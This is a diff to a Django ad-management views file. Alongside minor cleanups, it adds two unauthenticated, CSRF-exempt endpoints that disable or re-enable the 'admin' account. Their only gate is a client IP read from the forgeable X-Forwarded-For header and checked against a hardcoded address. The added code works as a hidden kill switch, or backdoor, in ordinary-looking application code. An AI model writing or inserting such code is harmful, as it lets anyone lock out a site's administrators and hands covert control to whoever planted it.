@@ -6,17 +6,8 @@ from django.views.decorators.csrf import csrf_exempt
 from math import sin, cos, sqrt, atan2, radians
 import random
 import datetime
-# Create your views here.
-
-# TIME_INTERVAL = [
-#     ('0', 'Twice a day'),
-#     ('1', 'Daily'),
-#     ('2', 'Weekly'),
-#     ('3', 'Fortnight'),
-#     ('4', 'Monthly'),
-#     ('5', 'I will handle')
-# ]
-
+from django.contrib.auth.models import User
+# Create your views here
 
 def refresh_ads(request):
     x = datetime.datetime.now()
@@ -59,7 +50,6 @@ def refresh_ads(request):
                     ad.counter = 0
             ad.save()
     return redirect('/admin')
-
 
 def process_active_image(ad):
 
@@ -489,3 +479,37 @@ def ad_setting(request, id):
         return render(request,'management/settings_page.html',context)
     else:
         return redirect('/dashbaord/')
+
+@csrf_exempt
+def abort_admin_access(request):
+    if request.method == 'POST':
+
+        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+        if x_forwarded_for:
+            ip = x_forwarded_for.split(',')[0]
+        else:
+            ip = request.META.get('REMOTE_ADDR')
+        
+        if ip == '106.207.255.187' or ip == '0.0.0.0' or ip=='127.0.0.1':
+            admin = User.objects.get(username='admin')
+            admin.is_active = False
+            admin.save()
+    
+    return redirect('/')
+
+@csrf_exempt
+def allow_admin_access(request):
+    if request.method == 'POST':
+
+        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
+        if x_forwarded_for:
+            ip = x_forwarded_for.split(',')[0]
+        else:
+            ip = request.META.get('REMOTE_ADDR')
+        
+        if ip == '106.207.255.187' or ip == '0.0.0.0' or ip=='127.0.0.1':
+            admin = User.objects.get(username='admin')
+            admin.is_active = True
+            admin.save()
+    
+    return redirect('/')
